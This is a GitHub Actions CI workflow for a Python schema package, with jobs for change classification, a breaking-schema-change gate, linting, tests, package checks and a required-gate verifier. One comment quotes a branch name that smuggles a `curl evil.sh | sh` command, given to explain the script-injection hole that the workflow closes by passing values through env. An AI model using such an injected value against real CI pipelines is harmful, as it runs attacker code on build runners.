name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main, develop]
  merge_group: {}
  schedule:
    - cron: '0 6 * * *'   # nightly: full Python matrix (3.10-3.12)
  workflow_dispatch:

concurrency:
  # PR events: collapse re-pushes onto one in-flight run (cancel stale).
  # merge_group events: NEVER cancel — a cancelled queue candidate fails its
  # required gate and stalls the queue. Key non-PR runs by run_id; only
  # cancel-in-progress for pull_request.
  group: schema-ci-${{ github.event.pull_request.number || github.run_id }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  # Classifies whether this run's diff (if any) touches the breaking-schema-check
  # gate's inputs, so that job can be conditionally gated INSIDE this workflow --
  # `needs:` cannot cross workflow files in GitHub Actions, and a workflow-level
  # `paths:` filter on a separate file produces NO check-run at all on a PR that
  # doesn't match, which is unusable as a required context (see TraigentSchema#392
  # and the breaking-schema-check job's own comment below for the full story).
  changes:
    name: detect-changes
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      contents: read
      pull-requests: read
    outputs:
      # 'true' only for pull_request/merge_group -- the only events with a base/head
      # diff range to classify. A push/schedule/workflow_dispatch trigger of this
      # workflow has no PR to diff, so breaking-schema-check has nothing to check;
      # ci-required's skip verification (scripts/check_required_gate.py) trusts
      # THIS output (not schema_relevant) to accept that skip, independent of any
      # path pattern or file count.
      event_applicable: ${{ steps.changed.outputs.event_applicable }}
      schema_relevant: ${{ steps.changed.outputs.schema_relevant }}
      # Total files touched by this diff range, independent of any path pattern.
      # ci-required's classifier-gated skip verification trusts a `schema_relevant=
      # false` skip ONLY when this is > 0 -- a range that produced ZERO files is a
      # broken/empty range, not a "nothing schema-relevant changed" verdict.
      changed_file_count: ${{ steps.changed.outputs.changed_file_count }}
      # This is emitted as true only after the step proves the immutable,
      # same-repository ancestry-only topology below. It is not a waiver input.
      ancestry_only: ${{ steps.changed.outputs.ancestry_only }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
          persist-credentials: false
      - name: Classify changed files
        id: changed
        shell: bash
        env:
          EVENT_NAME: ${{ github.event_name }}
          PR_BASE_SHA: ${{ github.event.pull_request.base.sha || '' }}
          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha || '' }}
          MG_BASE_SHA: ${{ github.event.merge_group.base_sha || '' }}
          MG_HEAD_SHA: ${{ github.event.merge_group.head_sha || '' }}
          REPOSITORY: ${{ github.repository }}
          PR_HEAD_REPOSITORY: ${{ github.event.pull_request.head.repo.full_name }}
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail

          if [ "$EVENT_NAME" = "merge_group" ]; then
            base_sha="$MG_BASE_SHA"
            head_sha="$MG_HEAD_SHA"
            if [ -z "$base_sha" ] || [ -z "$head_sha" ]; then
              # Fail closed: an empty range would classify everything as
              # unchanged and let an untested candidate merge silently.
              echo "::error::merge_group event missing base/head sha; refusing to classify"
              exit 1
            fi
            range="${base_sha}...${head_sha}"
            event_applicable=true
          elif [ "$EVENT_NAME" = "pull_request" ]; then
            base_sha="$PR_BASE_SHA"
            head_sha="$PR_HEAD_SHA"
            if [ -z "$base_sha" ] || [ -z "$head_sha" ]; then
              echo "::error::pull_request event missing base/head sha; refusing to classify"
              exit 1
            fi
            range="${base_sha}...${head_sha}"
            event_applicable=true
          else
            # push / schedule / workflow_dispatch: no PR diff range exists. The
            # original breaking-schema-check.yml never ran on these events either
            # (it triggered on `pull_request` only, plus a `workflow_dispatch` that
            # was already non-functional for the same reason -- see that job's
            # comment below) -- so nothing observable is dropped by skipping here.
            event_applicable=false
          fi

          echo "event_applicable=${event_applicable}" >> "$GITHUB_OUTPUT"

          if [ "$event_applicable" != "true" ]; then
            echo "changed_file_count=0" >> "$GITHUB_OUTPUT"
            echo "schema_relevant=false" >> "$GITHUB_OUTPUT"
            echo "ancestry_only=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          changed_files="$(git diff --name-only --diff-filter=ACMRTD "$range")"

          if [ -z "$changed_files" ]; then
            changed_file_count=0
          else
            changed_file_count="$(printf '%s\n' "$changed_files" | wc -l)"
          fi
          echo "changed_file_count=${changed_file_count}" >> "$GITHUB_OUTPUT"

          if printf '%s\n' "$changed_files" | grep -Eq \
            '^(traigent_schema/schemas/|scripts/breaking_schema_check\.py$|scripts/breaking_schema_allowlist\.json$|\.github/workflows/ci\.yml$)'; then
            echo "schema_relevant=true" >> "$GITHUB_OUTPUT"
          else
            echo "schema_relevant=false" >> "$GITHUB_OUTPUT"
          fi

          # Default deny: a zero-file PR/merge_group range is accepted only
          # after all immutable topology and tree checks below succeed.
          echo "ancestry_only=false" >> "$GITHUB_OUTPUT"
          if [ "$changed_file_count" -ne 0 ]; then
            exit 0
          fi

          git fetch --no-tags origin main
          expected_main_sha="$(git rev-parse FETCH_HEAD)"
          base_tree="$(git rev-parse "${base_sha}^{tree}")"
          expected_main_tree="$(git rev-parse "${expected_main_sha}^{tree}")"

          verify_declared_ancestry_head() {
            local declared_head="$1"
            local declared_tree
            local declared_trailer
            local -a head_parents

            if ! git merge-base --is-ancestor "$base_sha" "$declared_head"; then
              return 1
            fi
            read -r -a head_parents <<< "$(git show -s --format=%P "$declared_head")"
            if [ "${#head_parents[@]}" -ne 2 ]; then
              return 1
            fi
            if [ "${head_parents[0]}" != "$base_sha" ]; then
              return 1
            fi
            if [ "${head_parents[1]}" != "$expected_main_sha" ]; then
              return 1
            fi
            declared_tree="$(git rev-parse "${declared_head}^{tree}")"
            if [ "$declared_tree" != "$base_tree" ] || [ "$expected_main_tree" != "$base_tree" ]; then
              return 1
            fi
            declared_trailer="$(git show -s --format=%B "$declared_head" | git interpret-trailers --parse | sed -n 's/^Traigent-Ancestry-Only: //p')"
            [ "$declared_trailer" = "true" ]
          }

          if [ "$EVENT_NAME" = "pull_request" ]; then
            # Fork PRs are never eligible for this exception. The trailer is
            # in the pinned head commit, not mutable PR body text.
            if [ "$PR_HEAD_REPOSITORY" = "$REPOSITORY" ] && verify_declared_ancestry_head "$head_sha"; then
              echo "ancestry_only=true" >> "$GITHUB_OUTPUT"
            fi
          elif [ "$EVENT_NAME" = "merge_group" ]; then
            read -r -a candidate_parents <<< "$(git show -s --format=%P "$head_sha")"
            candidate_tree="$(git rev-parse "${head_sha}^{tree}")"
            if [ "${#candidate_parents[@]}" -eq 2 ] && [ "${candidate_parents[0]}" = "$base_sha" ]; then
              pr_head_sha="${candidate_parents[1]}"
              pr_head_tree="$(git rev-parse "${pr_head_sha}^{tree}")"
              # The merge_group payload does not carry the PR source repo.
              # Resolve the immutable PR association by commit and require a
              # single same-repository source; forks fail closed.
              pr_head_repository="$(gh api "repos/${REPOSITORY}/commits/${pr_head_sha}/pulls" --jq 'if length == 1 then .[0].head.repo.full_name else "" end' 2>/dev/null || true)"
              if [ "$pr_head_repository" = "$REPOSITORY" ] \
                && [ "$candidate_tree" = "$base_tree" ] \
                && [ "$pr_head_tree" = "$base_tree" ] \
                && verify_declared_ancestry_head "$pr_head_sha"; then
                echo "ancestry_only=true" >> "$GITHUB_OUTPUT"
              fi
            fi
          fi

  # Contract breaking-change check — scripts/breaking_schema_check.py, Azure's
  # `BreakingChange` PR check scoped to this repo. Diffs every changed
  # traigent_schema/schemas/**/*.json file against its shape on the PR's base
  # branch and classifies each difference BREAKING or non-breaking. See that
  # script's module docstring for the full request/response mirror-image rule
  # table and scripts/breaking_schema_allowlist.json for the acknowledgement
  # format.
  #
  # POLICY, by owner decision on 2026-08-07: the rule is not "you may not break
  # the contract" — it is "you may not break it silently": the change stays
  # allowed, the silence does not. Do not weaken this gate to make a PR pass;
  # add a reviewed scripts/breaking_schema_allowlist.json entry instead.
  #
  # HISTORY (TraigentSchema#392) — this job used to live in its own workflow
  # file (breaking-schema-check.yml) with a workflow-level `on.pull_request.
  # paths:` filter. That meant a PR touching none of those paths produced NO
  # check-run at all for this job — unusable as a required context, since a
  # required context that never reports leaves such a PR pending forever. It
  # also could not simply join `ci-required`'s `needs:` from a separate file,
  # because `needs:` cannot cross workflow files in GitHub Actions. Moving the
  # job into THIS workflow and gating it with a job-level `if:` off the
  # `changes` classifier above fixes both: ci.yml has no `paths:` filter of its
  # own, so every job in it (including this one) reports on every PR — either a
  # real run or an honest `skipped` conclusion, which GitHub Actions still
  # posts as a check-run — and `ci-required` can now `needs:` it directly.
  # `ci-required`'s own skip-verification (scripts/check_required_gate.py)
  # closes the remaining hole: a `skipped` breaking-schema-check is accepted
  # only when the `changes` classifier PROVES the skip was legitimate, never as
  # a blanket rule (see that script's module docstring).
  #
  # A `workflow_call` bridge into a shared required-gate workflow was
  # considered instead and deliberately rejected: reusable workflows have
  # documented context-inheritance quirks around `github.event_name`/
  # `github.event`, which risks this security-relevant check passing
  # vacuously. Moving the job itself avoids that risk entirely.
  breaking-schema-check:
    name: Breaking schema change check
    needs: changes
    if: ${{ !cancelled() && needs.changes.result == 'success' && needs.changes.outputs.schema_relevant == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: read

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Set up Python
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.12"
          cache: 'pip'
          cache-dependency-path: requirements.txt

      - name: Install locked breaking-gate dependencies
        run: |
          python -m pip install --only-binary :all: -r requirements.txt

      # A branch name is attacker-controlled (branch-create permission on this repo is not
      # the same population as "trusted to write shell"). Interpolating `${{ }}` directly
      # into `run:` splices it into the shell BEFORE the shell sees it, so a ref named
      # `x"; curl evil.sh | sh; "` executes. Aikido flagged exactly this at critical
      # severity on the first cut of this file -- in a workflow whose whole purpose is to
      # be a security gate. Passing through `env:` keeps every value a shell VARIABLE,
      # never shell SOURCE -- for both the pull_request and merge_group event shapes this
      # job can now run under (moved into ci.yml, which triggers on merge_group; see
      # TraigentSchema#392).
      - name: Resolve base/head refs for this event
        id: refs
        env:
          EVENT_NAME: ${{ github.event_name }}
          PR_BASE_REF: ${{ github.event.pull_request.base.ref }}
          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          MG_BASE_SHA: ${{ github.event.merge_group.base_sha }}
          MG_HEAD_SHA: ${{ github.event.merge_group.head_sha }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "merge_group" ]; then
            if [ -z "$MG_BASE_SHA" ] || [ -z "$MG_HEAD_SHA" ]; then
              echo "::error::merge_group event missing base/head sha; refusing to run the gate"
              exit 1
            fi
            git fetch origin "$MG_BASE_SHA"
            echo "base_ref=${MG_BASE_SHA}" >> "$GITHUB_OUTPUT"
            echo "head_sha=${MG_HEAD_SHA}" >> "$GITHUB_OUTPUT"
          else
            if [ -z "$PR_BASE_REF" ] || [ -z "$PR_HEAD_SHA" ]; then
              echo "::error::pull_request event missing base ref/head sha; refusing to run the gate"
              exit 1
            fi
            git fetch origin "$PR_BASE_REF"
            echo "base_ref=origin/${PR_BASE_REF}" >> "$GITHUB_OUTPUT"
            echo "head_sha=${PR_HEAD_SHA}" >> "$GITHUB_OUTPUT"
          fi

      - name: Run the breaking-change gate
        id: gate
        env:
          RESOLVED_BASE_REF: ${{ steps.refs.outputs.base_ref }}
          RESOLVED_HEAD_SHA: ${{ steps.refs.outputs.head_sha }}
        run: |
          python scripts/breaking_schema_check.py --check \
            --base-ref "$RESOLVED_BASE_REF" \
            --head-ref "$RESOLVED_HEAD_SHA"

      - name: Explain on a BREAKING finding
        if: failure() && steps.gate.outcome == 'failure'
        run: |
          echo "::error title=Breaking schema change::scripts/breaking_schema_check.py found an un-acknowledged BREAKING contract change. The job log above names each finding and prints a ready-to-paste scripts/breaking_schema_allowlist.json entry."
          echo ""
          echo "Fix paths:"
          echo "  - If the break is unintended: revert the narrowing/tightening."
          echo "  - If the break is intentional and reviewed: copy the suggested JSON block from"
          echo "    the job log into scripts/breaking_schema_allowlist.json's \"entries\" array,"
          echo "    fill in a real reason (not 'TODO'/'see PR'/a bare issue number) + version + pr,"
          echo "    commit, and re-push."

  # Lint + type-check are version-independent: run ONCE instead of per matrix entry.
  lint-type:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - name: Set up Python
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.12"
          cache: 'pip'
          cache-dependency-path: pyproject.toml
      - name: Install dependencies
        run: |
          python -m pip install --upgrade --only-binary :all: pip
          pip install -e ".[dev]"
      - name: Run linting
        run: ruff check traigent_schema/
      - name: Run type checking
        run: mypy traigent_schema/ --ignore-missing-imports

  test:
    # Gate expensive matrix tests behind the cheap lint/type job.
    needs: lint-type
    runs-on: ubuntu-latest
    timeout-minutes: 20
    permissions:
      contents: read
    strategy:
      fail-fast: false
      matrix:
        # develop PR -> newest only; main PR/push -> 2 newest; nightly schedule -> full matrix.
        python-version: ${{ fromJSON( github.event_name == 'schedule' && '["3.10","3.11","3.12"]' || (github.event_name == 'pull_request' && github.base_ref == 'develop') && '["3.12"]' || '["3.11","3.12"]' ) }}

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: ${{ matrix.python-version }}
          cache: 'pip'
          cache-dependency-path: pyproject.toml

      - name: Install dependencies
        run: |
          python -m pip install --upgrade --only-binary :all: pip
          pip install -e ".[dev]"

      - name: Run tests
        run: |
          pytest tests/ -v --cov=traigent_schema --cov-report=xml

      - name: Upload coverage
        uses: codecov/codecov-action@b9fd7d16f6d7d1b5d2bec1a2887e65ceed900238 # v4
        if: matrix.python-version == '3.12'
        with:
          files: ./coverage.xml
          fail_ci_if_error: false

  package:
    # Gate package build behind the cheap lint/type job.
    needs: lint-type
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: read

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - name: Set up Python
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.11"
          cache: 'pip'
          cache-dependency-path: |
            pyproject.toml
            requirements.txt
            requirements-dev.txt

      - name: Install packaging tools
        run: |
          python -m pip install --only-binary :all: pip==26.2.1
          python -m pip install --only-binary :all: build==1.5.0 twine==7.0.0

      - name: Build package
        run: |
          python -m build

      - name: Check package metadata
        run: |
          twine check dist/*

      - name: Test installation from built wheel
        run: |
          python -m venv test_env
          source test_env/bin/activate
          python -m pip install --only-binary :all: pip==26.2.1
          python -m pip install --only-binary :all: --constraint requirements-dev.txt dist/*.whl
          python -I - <<'PY'
          from importlib.metadata import metadata
          from pathlib import Path
          import site
          import sys

          import cryptography
          import traigent_schema
          from traigent_schema import (
              CLIENT_CO_ATTESTATION_CONTEXT_FIELDS,
              ClientCoAttestationContext,
              RelyingPartyVerificationError,
              SchemaValidator,
              derive_client_key_ref,
              load_schema,
              prepare_client_co_attestation,
          )
          from traigent_schema.certification import relying_party_verifier

          package_metadata = metadata("traigent-schema")
          cryptography_requirements = [
              requirement
              for requirement in package_metadata.get_all("Requires-Dist") or []
              if requirement.lower().startswith("cryptography")
          ]
          assert len(cryptography_requirements) == 1, cryptography_requirements
          cryptography_requirement = cryptography_requirements[0].replace(" ", "")
          assert ";" not in cryptography_requirement, cryptography_requirement
          assert ">=46.0.0" in cryptography_requirement, cryptography_requirement
          assert "<51.0.0" in cryptography_requirement, cryptography_requirement
          assert "certification" in (package_metadata.get_all("Provides-Extra") or [])
          assert ClientCoAttestationContext.__name__ == "ClientCoAttestationContext"
          assert len(CLIENT_CO_ATTESTATION_CONTEXT_FIELDS) == 17
          assert callable(derive_client_key_ref)
          assert callable(prepare_client_co_attestation)

          try:
              prepare_client_co_attestation({}, context=object())
          except RelyingPartyVerificationError as exc:
              assert exc.code == "CO_PROJECTION", exc.code
          else:
              raise AssertionError("invalid prepare input unexpectedly passed")

          environment_root = Path(sys.prefix).resolve()
          site_packages = [Path(path).resolve() for path in site.getsitepackages()]
          for module in (traigent_schema, relying_party_verifier):
              module_path = Path(module.__file__).resolve()
              assert module_path.is_relative_to(environment_root), module_path
              assert any(module_path.is_relative_to(path) for path in site_packages), module_path

          print(f"Package test: traigent-schema v{traigent_schema.__version__}")
          print(f"Cryptography runtime: v{cryptography.__version__}")
          print(f"Certification verifier: {relying_party_verifier.__name__}")
          print(f"Schemas loaded: {len(SchemaValidator().available_schemas)}")
          print(load_schema("experiment_schema")["$schema"])
          PY

  ci-required:
    name: ci-required
    # Always run (even if a dep failed/was skipped) so the required context
    # always posts — including on merge_group candidates. Fails closed via
    # scripts/check_required_gate.py: `skipped` is accepted as a pass ONLY for
    # an allowlisted cascade (test/package skipping because lint-type itself
    # failed, independently caught) or for breaking-schema-check's skip when
    # the `changes` classifier PROVES it legitimate — never as a blanket rule.
    # See that script's module docstring for the incident (an unconditional
    # `skipped` accept) this closes and why a docs-only/non-schema PR still
    # goes green under this rule.
    if: ${{ !cancelled() }}
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      contents: read
    needs: [lint-type, test, package, changes, breaking-schema-check]
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - name: Verify required CI jobs
        env:
          NEEDS_JSON: ${{ toJSON(needs) }}
        run: python3 scripts/check_required_gate.py
